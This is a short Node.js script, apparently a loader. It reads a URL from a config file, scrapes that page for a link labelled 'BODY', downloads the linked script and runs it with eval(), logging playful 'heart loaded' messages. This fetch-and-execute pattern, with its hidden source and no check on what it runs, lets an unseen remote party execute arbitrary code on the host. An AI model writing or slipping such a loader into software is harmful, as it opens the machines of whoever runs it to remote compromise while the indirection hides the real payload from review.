
const axios = require('axios');
const cheerio = require('cheerio');
const bravo = require("./config");

async function fetchBODYUrl() {
  try {
    const response = await axios.get(bravo.jeepers_creeper);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("BODY")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('heart not found 😭');
    }

    console.log('The heart is loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchBODYUrl();
